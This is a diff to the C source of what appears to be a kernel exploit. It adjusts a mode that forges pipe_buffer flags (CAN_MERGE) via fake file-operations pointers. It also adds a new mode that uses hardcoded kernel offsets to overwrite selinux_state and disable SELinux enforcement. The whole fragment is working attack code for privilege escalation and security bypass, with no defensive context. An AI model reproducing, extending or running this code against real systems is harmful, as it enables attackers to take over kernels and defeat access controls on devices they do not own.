@@ -402,12 +402,24 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         g_main_pc = (uint64_t)fake_fops;
         g_main_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + misc_off);
         if (env_flag("MODE4_PIPE_FLAG", 0) && page_base) {
-          /* VALUE = page base + 0x10 (low byte 0x10 = CAN_MERGE exactly).
-           * 32KB-aligned base → clean bit pattern, no PACKET/LRU/GIFT. */
           g_main_pc = (uint64_t)page_base + 0x10;
           g_main_left = (uint64_t)pselect_write_target();
-          pr_info("JC2 PIPE_FLAG: pc=%016llx (CAN_MERGE) left=%016llx "
-                  "(&pipe_buffer.flags)\n",
+          pr_info("JC2 PIPE_FLAG: pc=%016llx (CAN_MERGE) left=%016llx\n",
+                  (unsigned long long)g_main_pc,
+                  (unsigned long long)g_main_left);
+        }
+        if (env_flag("MODE4_SELINUX", 0)) {
+          /* Z15-proven VALUE: P0 of .bss offset 0x02BB0000 — LE bytes
+           * 00 00 BB 2A ... → disabled=0, enforcing=0, initialized=0x2A≠0
+           * (avoids the SID flood that killed Z4's NULL store). */
+          g_main_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x02BB0000ULL);
+          uint64_t sel_off =
+              (active_offsets && active_offsets->off_selinux_enforcing)
+                  ? (uint64_t)active_offsets->off_selinux_enforcing
+                  : 0x02A793C8ULL;
+          g_main_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + sel_off);
+          pr_info("JC2 SELINUX: pc=%016llx (Z15 value) left=%016llx "
+                  "(&selinux_state)\n",
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
